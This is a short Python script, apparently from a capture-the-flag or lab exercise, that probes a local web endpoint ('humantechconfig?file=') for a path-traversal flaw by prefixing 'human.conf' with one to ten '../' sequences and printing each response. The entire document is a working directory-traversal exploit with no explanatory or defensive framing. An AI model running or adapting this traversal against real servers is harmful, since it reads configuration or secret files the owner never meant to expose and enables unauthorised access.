import urllib.request

tv = '../'
file = 'human.conf'
website = 'http://127.0.0.1:8082/humantechconfig?file='

for i in range(1, 11):
  payload = tv * i + file
  payload = website + payload

  response = urllib.request.urlopen(payload)
  print(response.read())
